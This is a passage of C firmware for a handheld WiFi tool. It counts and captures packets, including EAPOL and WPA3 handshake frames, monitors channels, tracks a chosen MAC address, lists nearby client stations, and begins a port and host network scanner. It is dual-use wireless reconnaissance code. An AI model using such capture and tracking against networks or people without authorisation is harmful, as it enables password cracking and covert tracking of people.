		memcpy(&last_resp, &resp, sizeof(m1_resp_t));
		has_pkt = true;
		sniffer_draw_packet(&last_resp, title, pkt_count, false);
	}
}

/*============================================================================*/
/*  Packet Count                                                              */
/*============================================================================*/
void wifi_packet_count(void)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	m1_cmd_t cmd;
	m1_resp_t resp;
	uint32_t total = 0;
	uint32_t beacons = 0;
	uint32_t probes = 0;
	uint32_t deauths = 0;
	uint32_t eapol = 0;
	uint32_t sae = 0;
	uint32_t raw = 0;
	uint32_t other = 0;
	int8_t last_rssi = 0;
	uint8_t last_ch = 0;
	char ln[26];
	int spi_ret;
	bool pcap_active;

	ensure_esp32_ready();
	wifi_capture_cfg_load();
	pcap_active = wifi_pcap_open(SNIFF_ALL);

	memset(&cmd, 0, sizeof(cmd));
	cmd.magic = M1_CMD_MAGIC;
	cmd.cmd_id = CMD_PKTMON_START;
	cmd.payload_len = 4;
	cmd.payload[0] = SNIFF_ALL;
	cmd.payload[1] = 0;
	cmd.payload[2] = 5;
	cmd.payload[3] = pcap_active ? 0x01 : 0x00;

	spi_ret = m1_esp32_send_cmd(&cmd, &resp, SNIFF_CMD_TIMEOUT);
	if (spi_ret != 0 || resp.status != RESP_OK)
	{
		wifi_pcap_close();
		wifi_show_message("Packet Count", "Start failed", "Flash ESP32 FW?");
		return;
	}

	while (1)
	{
		ret = xQueueReceive(main_q_hdl, &q_item, pdMS_TO_TICKS(SNIFF_POLL_MS));
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &btn, 0);
			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				m1_esp32_simple_cmd(CMD_PKTMON_STOP, &resp, 1000);
				wifi_pcap_close();
				xQueueReset(main_q_hdl);
				break;
			}
		}

		(void)wifi_pcap_poll(3);

		spi_ret = m1_esp32_simple_cmd(CMD_PKTMON_NEXT, &resp, WIFI_NEXT_TIMEOUT_MS);
		if (spi_ret == 0 && resp.status == RESP_OK && resp.payload_len >= 4)
		{
			total++;
			last_rssi = (int8_t)resp.payload[1];
			last_ch = resp.payload[2];
			switch (resp.payload[0])
			{
			case SNIFF_BEACON:
			case SNIFF_PWNAGOTCHI:
				beacons++;
				break;
			case SNIFF_PROBE_REQ:
				probes++;
				break;
			case SNIFF_DEAUTH:
				deauths++;
				break;
			case SNIFF_EAPOL:
				eapol++;
				break;
			case SNIFF_SAE:
				sae++;
				break;
			case SNIFF_ALL:
				raw++;
				break;
			default:
				other++;
				break;
			}
		}

		m1_u8g2_firstpage();
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
		u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT,
			"PACKET COUNT");
		u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
		snprintf(ln, sizeof(ln), "Total:%lu CH:%u",
			(unsigned long)total, last_ch);
		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START, ln);
		snprintf(ln, sizeof(ln), "B:%lu P:%lu D:%lu",
			(unsigned long)beacons, (unsigned long)probes, (unsigned long)deauths);
		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + SF_Y_STEP, ln);
		snprintf(ln, sizeof(ln), "E:%lu S:%lu R:%lu",
			(unsigned long)eapol, (unsigned long)sae, (unsigned long)raw);
		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 2 * SF_Y_STEP, ln);
		snprintf(ln, sizeof(ln), "O:%lu RSSI:%d",
			(unsigned long)other, last_rssi);
		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 3 * SF_Y_STEP, ln);
		u8g2_DrawStr(&m1_u8g2, 2, 63, "[BACK] Stop");
		m1_u8g2_nextpage();
	}
}


/*============================================================================*/
/*  Signal Monitor UI                                                        */
/*============================================================================*/
void wifi_signal_monitor(void)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	m1_cmd_t cmd;
	m1_resp_t resp;
	int spi_ret;
	uint8_t scroll_top = 1; /* first channel shown */
	char ln[26];

	ensure_esp32_ready();

	/* Start signal monitor */
	memset(&cmd, 0, sizeof(cmd));
	cmd.magic = M1_CMD_MAGIC;
	cmd.cmd_id = CMD_PKTMON_START;
	cmd.payload_len = 3;
	cmd.payload[0] = SNIFF_SIGNAL;
	cmd.payload[1] = 0;
	cmd.payload[2] = 5;

	spi_ret = m1_esp32_send_cmd(&cmd, &resp, SNIFF_CMD_TIMEOUT);
	if (spi_ret != 0 || resp.status != RESP_OK)
	{
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		m1_u8g2_firstpage();
		u8g2_DrawStr(&m1_u8g2, 6, 15, "Signal Monitor");
		u8g2_DrawStr(&m1_u8g2, 6, 30, "Start failed!");
		m1_u8g2_nextpage();
		HAL_Delay(2000);
		return;
	}

	while (1)
	{
		ret = xQueueReceive(main_q_hdl, &q_item, pdMS_TO_TICKS(500));
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &btn, 0);
			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				m1_esp32_simple_cmd(CMD_PKTMON_STOP, &resp, 1000);
				xQueueReset(main_q_hdl);
				break;
			}
			if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK && scroll_top > 1)
				scroll_top--;
			if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK && scroll_top < 9)
				scroll_top++;
		}

		/* Poll channel stats */
		spi_ret = m1_esp32_simple_cmd(CMD_PKTMON_NEXT, &resp, 500);
		if (spi_ret != 0 || resp.status != RESP_OK || resp.payload_len < 2)
			continue;

		uint8_t num_ch = resp.payload[0];
		if (num_ch > 13) num_ch = 13;

		/* Parse channel data: [ch(1) + count_lo(1) + count_hi(1) + avg_rssi(1)] */
		uint16_t counts[14] = {0};
		int8_t   rssis[14]  = {0};
		for (uint8_t i = 0; i < num_ch; i++)
		{
			uint8_t off = 1 + i * 4;
			if (off + 3 >= resp.payload_len) break;
			uint8_t c = resp.payload[off];
			if (c >= 1 && c <= 13)
			{
				counts[c] = resp.payload[off + 1] | (resp.payload[off + 2] << 8);
				rssis[c] = (int8_t)resp.payload[off + 3];
			}
		}

		/* Find max count for bar scaling */
		uint16_t max_cnt = 1;
		for (uint8_t i = 1; i <= 13; i++)
			if (counts[i] > max_cnt) max_cnt = counts[i];

		/* Draw */
		m1_u8g2_firstpage();
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
		u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT,
			"Signal Monitor");

		u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
		uint8_t y = SF_Y_START;

		for (uint8_t c = scroll_top; c < scroll_top + 5 && c <= 13; c++)
		{
			/* Channel number + bar + count + RSSI */
			sprintf(ln, "%2d", c);
			u8g2_DrawStr(&m1_u8g2, 0, y, ln);

			/* Draw bar: 40px max width starting at x=14 */
			if (counts[c] > 0)
			{
				uint8_t bar_w = (uint8_t)((uint32_t)counts[c] * 40 / max_cnt);
				if (bar_w < 1) bar_w = 1;
				u8g2_DrawBox(&m1_u8g2, 14, y - 6, bar_w, 6);
			}

			/* Count and RSSI text after bar area */
			if (counts[c] > 0)
				sprintf(ln, "%d %ddB", counts[c], rssis[c]);
			else
				sprintf(ln, "0");
			u8g2_DrawStr(&m1_u8g2, 58, y, ln);

			y += SF_Y_STEP;
		}

		m1_u8g2_nextpage();
	}
}

/*============================================================================*/
/*  Channel Analyzer                                                          */
/*============================================================================*/
void wifi_channel_analyzer(void)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	uint8_t scroll_top = 1;
	bool redraw = true;
	uint16_t counts[14];
	int16_t rssi_sum[14];
	int8_t best_rssi[14];
	char ln[26];

	ensure_esp32_ready();
	wifi_show_message("Channel Analyzer", "Scanning APs...", NULL);
	if (wifi_do_scan() == 0)
	{
		wifi_show_message("Channel Analyzer", "No APs found", NULL);
		return;
	}

	while (1)
	{
		if (redraw)
		{
			memset(counts, 0, sizeof(counts));
			memset(rssi_sum, 0, sizeof(rssi_sum));
			for (uint8_t c = 1; c <= 13; c++) best_rssi[c] = -127;

			for (uint16_t i = 0; i < ap_count; i++)
			{
				uint8_t ch = ap_list[i].channel;
				if (ch < 1 || ch > 13) continue;
				counts[ch]++;
				rssi_sum[ch] += ap_list[i].rssi;
				if (ap_list[i].rssi > best_rssi[ch])
				{
					best_rssi[ch] = ap_list[i].rssi;
				}
			}

			m1_u8g2_firstpage();
			u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
			u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
			u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT,
				"CHANNEL ANALYZER");

			u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
			uint8_t y = SF_Y_START;
			for (uint8_t ch = scroll_top; ch < scroll_top + 5 && ch <= 13; ch++)
			{
				if (counts[ch] > 0)
				{
					int avg = rssi_sum[ch] / counts[ch];
					snprintf(ln, sizeof(ln), "C%u N%u A%d B%d",
						ch, counts[ch], avg, best_rssi[ch]);
				}
				else
				{
					snprintf(ln, sizeof(ln), "%2u AP:0", ch);
				}
				u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += SF_Y_STEP;
			}
			u8g2_DrawStr(&m1_u8g2, 2, 63, "[OK]Rescan [BACK]Exit");
			m1_u8g2_nextpage();
			redraw = false;
		}

		ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &btn, 0);
			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				xQueueReset(main_q_hdl);
				break;
			}
			else if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK && scroll_top > 1)
			{
				scroll_top--;
				redraw = true;
			}
			else if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK && scroll_top < 10)
			{
				scroll_top++;
				redraw = true;
			}
			else if (btn.event[BUTTON_OK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				wifi_show_message("Channel Analyzer", "Rescanning...", NULL);
				if (wifi_do_scan() == 0)
				{
					wifi_show_message("Channel Analyzer", "No APs found", NULL);
					break;
				}
				redraw = true;
			}
		}
	}
}

typedef struct {
	uint8_t  mac[6];
	int8_t   rssi;
	uint8_t  channel;
	uint8_t  bssid[6];
	bool     selected;
	char     ssid[33];
	char     mac_str[18];
} wifi_sta_t;

#define STA_MAX 64

static wifi_sta_t *sta_list_data = NULL;
static uint16_t sta_total = 0;
static uint16_t sta_view_idx = 0;

static bool wifi_mac_is_zero(const uint8_t mac[6])
{
	for (uint8_t i = 0; i < 6; i++)
	{
		if (mac[i]) return false;
	}
	return true;
}

static void wifi_format_mac(const uint8_t mac[6], char *out, size_t out_len)
{
	snprintf(out, out_len, "%02X:%02X:%02X:%02X:%02X:%02X",
		mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

static bool wifi_mac_match(const uint8_t *a, const uint8_t *b)
{
	return memcmp(a, b, 6) == 0;
}

static bool wifi_mac_track_pick_selected(uint8_t target[6], char *label, size_t label_len)
{
	if (sta_list_data)
	{
		for (uint16_t i = 0; i < sta_total; i++)
		{
			if (!sta_list_data[i].selected) continue;
			memcpy(target, sta_list_data[i].mac, 6);
			snprintf(label, label_len, "STA %d/%d", i + 1, sta_total);
			return true;
		}
	}

	if (ap_list)
	{
		for (uint16_t i = 0; i < ap_count; i++)
		{
			if (!ap_list[i].selected) continue;
			memcpy(target, ap_list[i].bssid, 6);
			snprintf(label, label_len, "AP %d/%d", i + 1, ap_count);
			return true;
		}
	}

	return false;
}

static bool wifi_mac_track_pick_manual(uint8_t target[6], char *label, size_t label_len)
{
	char data[18] = "00 00 00 00 00 00";

	if (m1_vkbs_get_data("Track MAC:", data) == 0)
	{
		return false;
	}

	memset(target, 0, 6);
	if (m1_strtob_with_base(data, target, 6, 16) != 6 || wifi_mac_is_zero(target))
	{
		wifi_show_message("MAC Track", "Need 6 bytes", "Example: AA BB...");
		return false;
	}

	snprintf(label, label_len, "Manual");
	return true;
}

static bool wifi_mac_track_resp_match(const m1_resp_t *resp, const uint8_t target[6],
	const char **ptype_out, const char **role_out, int8_t *rssi_out, uint8_t *ch_out)
{
	uint8_t ptype;
	uint8_t dlen;
	const uint8_t *d;

	if (!resp || resp->payload_len < 4)
	{
		return false;
	}

	ptype = resp->payload[0];
	dlen = resp->payload[3];
	d = &resp->payload[4];
	if (rssi_out) *rssi_out = (int8_t)resp->payload[1];
	if (ch_out) *ch_out = resp->payload[2];
	if (ptype_out) *ptype_out = "Other";
	if (role_out) *role_out = "Seen";

	switch (ptype)
	{
	case SNIFF_BEACON:
	case SNIFF_PWNAGOTCHI:
		if (ptype_out) *ptype_out = (ptype == SNIFF_PWNAGOTCHI) ? "Pwnagotchi" : "Beacon";
		if (dlen >= 6 && wifi_mac_match(&d[0], target))
		{
			if (role_out) *role_out = "BSSID";
			return true;
		}
		break;

	case SNIFF_PROBE_REQ:
		if (ptype_out) *ptype_out = "Probe";
		if (dlen >= 6 && wifi_mac_match(&d[0], target))
		{
			if (role_out) *role_out = "Client";
			return true;
		}
		break;

	case SNIFF_DEAUTH:
		if (ptype_out) *ptype_out = "Deauth";
		if (dlen >= 12)
		{
			if (wifi_mac_match(&d[0], target))
			{
				if (role_out) *role_out = "Source";
				return true;
			}
			if (wifi_mac_match(&d[6], target))
			{
				if (role_out) *role_out = "Dest";
				return true;
			}
		}
		break;

	case SNIFF_EAPOL:
		if (ptype_out) *ptype_out = "EAPOL";
		if (dlen >= 18)
		{
			if (wifi_mac_match(&d[0], target))
			{
				if (role_out) *role_out = "Source";
				return true;
			}
			if (wifi_mac_match(&d[6], target))
			{
				if (role_out) *role_out = "Dest";
				return true;
			}
			if (wifi_mac_match(&d[12], target))
			{
				if (role_out) *role_out = "BSSID";
				return true;
			}
		}
		break;

	case SNIFF_SAE:
		if (ptype_out) *ptype_out = "SAE";
		if (dlen >= 18)
		{
			if (wifi_mac_match(&d[0], target))
			{
				if (role_out) *role_out = "Source";
				return true;
			}
			if (wifi_mac_match(&d[6], target))
			{
				if (role_out) *role_out = "Dest";
				return true;
			}
			if (wifi_mac_match(&d[12], target))
			{
				if (role_out) *role_out = "BSSID";
				return true;
			}
		}
		break;

	default:
		if (ptype_out) *ptype_out = "Raw";
		if (dlen >= 13)
		{
			if (wifi_mac_match(&d[1], target))
			{
				if (role_out) *role_out = "Source";
				return true;
			}
			if (wifi_mac_match(&d[7], target))
			{
				if (role_out) *role_out = "Dest";
				return true;
			}
		}
		break;
	}

	return false;
}

void wifi_mac_track(void)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	m1_cmd_t cmd;
	m1_resp_t resp;
	uint8_t target[6] = {0};
	char target_str[18];
	char target_label[18];
	char ln[26];
	const char *last_type = "None";
	const char *last_role = "";
	int8_t last_rssi = 0;
	uint8_t last_ch = 0;
	uint32_t start_tick;
	uint32_t packets = 0;
	uint32_t hits = 0;
	int spi_ret;

	ensure_esp32_ready();

	if (!wifi_mac_track_pick_selected(target, target_label, sizeof(target_label)))
	{
		if (!wifi_mac_track_pick_manual(target, target_label, sizeof(target_label)))
		{
			return;
		}
	}
	wifi_format_mac(target, target_str, sizeof(target_str));

	memset(&cmd, 0, sizeof(cmd));
	cmd.magic = M1_CMD_MAGIC;
	cmd.cmd_id = CMD_PKTMON_START;
	cmd.payload_len = 3;
	cmd.payload[0] = SNIFF_ALL;
	cmd.payload[1] = 0;
	cmd.payload[2] = 3; /* faster hop for tracking */

	spi_ret = m1_esp32_send_cmd(&cmd, &resp, SNIFF_CMD_TIMEOUT);
	if (spi_ret != 0 || resp.status != RESP_OK)
	{
		wifi_show_message("MAC Track", "Start failed", "Flash ESP32 FW?");
		return;
	}

	start_tick = HAL_GetTick();

	while (1)
	{
		uint32_t elapsed = (HAL_GetTick() - start_tick) / 1000;

		m1_u8g2_firstpage();
		u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
		u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
		u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, "MAC TRACK");

		u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
		snprintf(ln, sizeof(ln), "%s", target_str);
		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START, ln);
		snprintf(ln, sizeof(ln), "Hits:%lu Pkts:%lu",
			(unsigned long)hits, (unsigned long)packets);
		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + SF_Y_STEP, ln);
		snprintf(ln, sizeof(ln), "%s %s", last_type, last_role);
		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 2 * SF_Y_STEP, ln);
		snprintf(ln, sizeof(ln), "CH:%u RSSI:%ddBm", last_ch, last_rssi);
		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 3 * SF_Y_STEP, ln);
		snprintf(ln, sizeof(ln), "%s %lus", target_label, (unsigned long)elapsed);
		u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 4 * SF_Y_STEP, ln);
		u8g2_DrawStr(&m1_u8g2, 2, 63, "[BACK] Stop");
		m1_u8g2_nextpage();

		ret = xQueueReceive(main_q_hdl, &q_item, pdMS_TO_TICKS(SNIFF_POLL_MS));
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &btn, 0);
			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				m1_esp32_simple_cmd(CMD_PKTMON_STOP, &resp, 1000);
				xQueueReset(main_q_hdl);
				break;
			}
		}

		spi_ret = m1_esp32_simple_cmd(CMD_PKTMON_NEXT, &resp, WIFI_NEXT_TIMEOUT_MS);
		if (spi_ret != 0 || resp.status != RESP_OK || resp.payload_len == 0)
		{
			continue;
		}

		packets++;
		if (wifi_mac_track_resp_match(&resp, target, &last_type, &last_role, &last_rssi, &last_ch))
		{
			hits++;
		}
	}
}


/*============================================================================*/
/*  Station Scan UI                                                          */
/*============================================================================*/

static void sta_list_free(void)
{
	if (sta_list_data) { free(sta_list_data); sta_list_data = NULL; }
	sta_total = 0;
	sta_view_idx = 0;
}

static uint16_t sta_do_scan(void)
{
	m1_cmd_t cmd;
	m1_resp_t resp;
	int ret;

	sta_list_free();

	/* Start station scan with channel hopping */
	memset(&cmd, 0, sizeof(cmd));
	cmd.magic = M1_CMD_MAGIC;
	cmd.cmd_id = CMD_STA_SCAN_START;
	cmd.payload_len = 1;
	cmd.payload[0] = 0; /* hop all channels */

	ret = m1_esp32_send_cmd(&cmd, &resp, SNIFF_CMD_TIMEOUT);
	if (ret != 0 || resp.status != RESP_OK)
		return 0;

	/* Show scanning screen with countdown */
	u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
	for (int sec = STA_SCAN_DURATION / 1000; sec > 0; sec--)
	{
		char msg[25];
		m1_u8g2_firstpage();
		u8g2_DrawStr(&m1_u8g2, 6, 15, "Scanning Stations...");
		u8g2_DrawXBMP(&m1_u8g2, M1_LCD_DISPLAY_WIDTH / 2 - 18 / 2,
			M1_LCD_DISPLAY_HEIGHT / 2 - 2, 18, 32, hourglass_18x32);
		sprintf(msg, "%ds remaining", sec);
		u8g2_DrawStr(&m1_u8g2, 6, 60, msg);
		m1_u8g2_nextpage();
		HAL_Delay(1000);
	}

	/* Stop scan — returns count and resets index */
	ret = m1_esp32_simple_cmd(CMD_STA_SCAN_STOP, &resp, SNIFF_CMD_TIMEOUT);
	if (ret != 0 || resp.status != RESP_OK)
		return 0;

	sta_total = resp.payload[0] | ((uint16_t)resp.payload[1] << 8);
	if (sta_total == 0)
		return 0;
	if (sta_total > STA_MAX)
		sta_total = STA_MAX;

	sta_list_data = (wifi_sta_t *)malloc(sta_total * sizeof(wifi_sta_t));
	if (!sta_list_data) { sta_total = 0; return 0; }
	memset(sta_list_data, 0, sta_total * sizeof(wifi_sta_t));

	/* Fetch each station record */
	for (uint16_t i = 0; i < sta_total; i++)
	{
		ret = m1_esp32_simple_cmd(CMD_STA_SCAN_NEXT, &resp, WIFI_NEXT_TIMEOUT_MS);
		if (ret != 0 || resp.status != RESP_OK || resp.payload_len < 15)
		{
			sta_total = i;
			break;
		}

		/* Unpack: mac(6) + rssi(1) + ch(1) + bssid(6) + ssid_len(1) + ssid(N) + remaining(2) */
		memcpy(sta_list_data[i].mac, &resp.payload[0], 6);
		sta_list_data[i].rssi = (int8_t)resp.payload[6];
		sta_list_data[i].channel = resp.payload[7];
		memcpy(sta_list_data[i].bssid, &resp.payload[8], 6);

		uint8_t sl = resp.payload[14];
		if (sl > 32) sl = 32;
		if (sl > 0)
			memcpy(sta_list_data[i].ssid, &resp.payload[15], sl);
		sta_list_data[i].ssid[sl] = '\0';

		sprintf(sta_list_data[i].mac_str, "%02X:%02X:%02X:%02X:%02X:%02X",
			sta_list_data[i].mac[0], sta_list_data[i].mac[1],
			sta_list_data[i].mac[2], sta_list_data[i].mac[3],
			sta_list_data[i].mac[4], sta_list_data[i].mac[5]);
	}

	return sta_total;
}

static uint16_t sta_list_print(bool up_dir)
{
	char ln[25];
	uint8_t y;

	if (!sta_list_data || !sta_total)
	{
		sta_view_idx = 0;
		return 0;
	}

	if (up_dir)
	{
		if (sta_view_idx == 0) sta_view_idx = sta_total - 1; else sta_view_idx--;
	}
	else
	{
		sta_view_idx++;
		if (sta_view_idx >= sta_total) sta_view_idx = 0;
	}

	m1_u8g2_firstpage();
	u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
	u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
	u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, "Stations:");

	sprintf(ln, "%d", sta_total);
	u8g2_DrawStr(&m1_u8g2, 2 + strlen("Stations: ") * M1_GUI_FONT_WIDTH + 2,
		M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, ln);

	sprintf(ln, "%s%d/%d", sta_list_data[sta_view_idx].selected ? "*" : "", sta_view_idx + 1, sta_total);
	u8g2_DrawStr(&m1_u8g2, M1_LCD_DISPLAY_WIDTH - 6 * M1_GUI_FONT_WIDTH,
		M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, ln);

	u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
	y = SF_Y_START;

	/* MAC address */
	u8g2_DrawStr(&m1_u8g2, 2, y, sta_list_data[sta_view_idx].mac_str);
	y += SF_Y_STEP;

	/* SSID or probe target */
	if (sta_list_data[sta_view_idx].ssid[0])
	{
		strncpy(ln, sta_list_data[sta_view_idx].ssid, 24);
		ln[24] = '\0';
	}
	else
		strcpy(ln, "*no probe*");
	u8g2_DrawStr(&m1_u8g2, 2, y, ln);
	y += SF_Y_STEP;

	/* Associated AP BSSID */
	uint8_t *b = sta_list_data[sta_view_idx].bssid;
	if (b[0] || b[1] || b[2] || b[3] || b[4] || b[5])
	{
		sprintf(ln, "AP:%02X:%02X:%02X:%02X:%02X:%02X",
			b[0], b[1], b[2], b[3], b[4], b[5]);
	}
	else
		strcpy(ln, "AP: unknown");
	u8g2_DrawStr(&m1_u8g2, 2, y, ln);
	y += SF_Y_STEP;

	/* RSSI and channel */
	sprintf(ln, "RSSI:%ddBm CH:%d", sta_list_data[sta_view_idx].rssi,
		sta_list_data[sta_view_idx].channel);
	u8g2_DrawStr(&m1_u8g2, 2, y, ln);

	u8g2_DrawStr(&m1_u8g2, 2, 63, "[OK]Sel [BACK]Exit");
	m1_u8g2_nextpage();
	return sta_total;
}


void wifi_station_scan(void)
{
	S_M1_Buttons_Status this_button_status;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	uint16_t list_count;

	ensure_esp32_ready();

	list_count = sta_do_scan();

	u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
	if (list_count)
	{
		sta_list_print(true);
	}
	else
	{
		m1_u8g2_firstpage();
		u8g2_DrawStr(&m1_u8g2, 6, 15, "Station Scan");
		u8g2_DrawXBMP(&m1_u8g2, M1_LCD_DISPLAY_WIDTH / 2 - 32 / 2,
			M1_LCD_DISPLAY_HEIGHT / 2 - 2, 32, 32, wifi_error_32x32);
		u8g2_DrawStr(&m1_u8g2, 6, 15 + M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT,
			"No stations found");
		m1_u8g2_nextpage();
	}

	while (1)
	{
		ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &this_button_status, 0);
				if (this_button_status.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
				{
					xQueueReset(main_q_hdl);
					break;
				}
			else if (this_button_status.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK)
			{
				if (list_count) sta_list_print(true);
			}
			else if (this_button_status.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK)
				{
					if (list_count) sta_list_print(false);
				}
				else if (this_button_status.event[BUTTON_OK_KP_ID] == BUTTON_EVENT_CLICK)
				{
					if (list_count && sta_list_data && sta_view_idx < sta_total)
					{
						sta_list_data[sta_view_idx].selected = !sta_list_data[sta_view_idx].selected;
						sta_list_print(true);
						sta_list_print(false);
					}
				}
		}
	}
}

void wifi_scan_all(void)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
	uint16_t aps;
	uint16_t stas;
	char ln[26];

	ensure_esp32_ready();

	wifi_show_message("Scan All", "Scanning APs...", NULL);
	aps = wifi_do_scan();

	wifi_show_message("Scan All", "Scanning stations...", NULL);
	stas = sta_do_scan();

	m1_u8g2_firstpage();
	u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
	u8g2_DrawXBMP(&m1_u8g2, 0, 0, 128, 14, m1_frame_128_14);
	u8g2_DrawStr(&m1_u8g2, 2, M1_GUI_ROW_SPACING + M1_GUI_FONT_HEIGHT, "SCAN ALL");
	u8g2_SetFont(&m1_u8g2, M1_DISP_FUNC_MENU_FONT_N);
	snprintf(ln, sizeof(ln), "APs:%u", aps);
	u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START, ln);
	snprintf(ln, sizeof(ln), "Stations:%u", stas);
	u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + SF_Y_STEP, ln);
	u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 2 * SF_Y_STEP, "Caches updated");
	u8g2_DrawStr(&m1_u8g2, 2, SF_Y_START + 3 * SF_Y_STEP, "Use Config views");
	u8g2_DrawStr(&m1_u8g2, 2, 63, "[BACK]Exit");
	m1_u8g2_nextpage();

	while (1)
	{
		ret = xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY);
		if (ret == pdTRUE && q_item.q_evt_type == Q_EVENT_KEYPAD)
		{
			xQueueReceive(button_events_q_hdl, &btn, 0);
			if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK)
			{
				xQueueReset(main_q_hdl);
				break;
			}
		}
	}
}


/*============================================================================*/
/*  Sniffer menu entry wrappers                                              */
/*============================================================================*/
void wifi_packet_monitor(void)   { wifi_sniffer_run(SNIFF_ALL, "Pkt Monitor"); }
void wifi_raw_sniff(void)        { wifi_sniffer_run(SNIFF_ALL, "Raw Sniff"); }
void wifi_sniff_all(void)        { wifi_sniffer_run(SNIFF_ALL, "All Packets"); }
void wifi_sniff_beacon(void)     { wifi_sniffer_run(SNIFF_BEACON, "Beacons"); }
void wifi_sniff_probe(void)      { wifi_sniffer_run(SNIFF_PROBE_REQ, "Probe Req"); }
void wifi_sniff_deauth(void)     { wifi_sniffer_run(SNIFF_DEAUTH, "Deauth"); }
void wifi_sniff_pwnagotchi(void) { wifi_sniffer_run(SNIFF_PWNAGOTCHI, "Pwnagotchi"); }
void wifi_sniff_sae(void)        { wifi_sniffer_run(SNIFF_SAE, "SAE/WPA3"); }


/*============================================================================*/
/*  Network Scanner UI                                                       */
/*============================================================================*/

#define NETSCAN_MODE_SSH    0
#define NETSCAN_MODE_TELNET 1
#define NETSCAN_MODE_COMMON 2
#define NETSCAN_MODE_PING   3
#define NETSCAN_MODE_ARP    4
#define NETSCAN_RESULTS_MAX 32

typedef struct {
	uint8_t ip[4];
	uint16_t port;
	uint8_t mac[6];
	bool has_mac;
} wifi_netscan_result_t;

static void wifi_netscan_run(uint8_t mode, const char *title)
{
	S_M1_Buttons_Status btn;
	S_M1_Main_Q_t q_item;
	BaseType_t ret;
